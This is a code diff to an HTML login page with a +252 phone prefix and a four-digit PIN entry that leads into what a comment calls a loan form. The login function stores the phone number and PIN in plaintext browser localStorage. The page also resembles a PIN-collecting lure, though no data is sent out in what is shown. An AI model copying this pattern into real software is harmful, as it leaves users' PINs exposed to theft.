@@ -18,7 +18,7 @@ h2{font-weight:normal;color:#555;margin-bottom:25px;font-size:24px}
 .pin-box{display:flex;justify-content:center;gap:12px;margin-bottom:10px}
 .pin-box input{width:55px;height:55px;text-align:center;font-size:24px;border:2px solid #65a30d;border-radius:10px;outline:none}
 .pin-box input:focus{border-color:#84cc16}
-.forgot{color:#888;font-size:13px;margin-bottom:30px;cursor:pointer}
+.forgot{color:#888;font-size:13px;margin-bottom:30px}
 .btn{width:100%;padding:16px;background:#ccc;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:not-allowed;transition:0.3s}
 .btn.active{background:linear-gradient(90deg,#84cc16,#65a30d);cursor:pointer}
 .footer{background:linear-gradient(135deg,#84cc16,#65a30d);color:white;text-align:center;padding:35px 20px;margin-top:auto;border-radius:40px 40px 0 0}
@@ -44,7 +44,7 @@ h2{font-weight:normal;color:#555;margin-bottom:25px;font-size:24px}
 <input type="password" maxlength="1" id="p3" oninput="move(3)">
 <input type="password" maxlength="1" id="p4" oninput="move(4)">
 </div>
-<p class="forgot">Can you be executed?</p>
+<p class="forgot">Forgot PIN?</p>
 
 <button class="btn" id="galBtn" onclick="login()">GAL</button>
 </div>
@@ -75,12 +75,15 @@ function checkBtn(){
 function login(){
   let phone = '+252' + document.getElementById('phone').value;
   let pin = document.getElementById('p1').value + document.getElementById('p2').value + document.getElementById('p3').value + document.getElementById('p4').value;
+  
   localStorage.setItem('loginPhone', phone);
   localStorage.setItem('loginPIN', pin);
-  window.location='step1.html'; // goes to first step of loan form
+  
+  // GO TO LOADING PAGE FIRST, THEN STEP1
+  window.location='loading.html?next=step1.html'; 
 }
 
-// Allow backspace to go back
+// Backspace
 for(let i=1;i<=4;i++){
   document.getElementById('p'+i).onkeydown = function(e){
     if(e.key=="Backspace" && this.value=="" && i>1) 
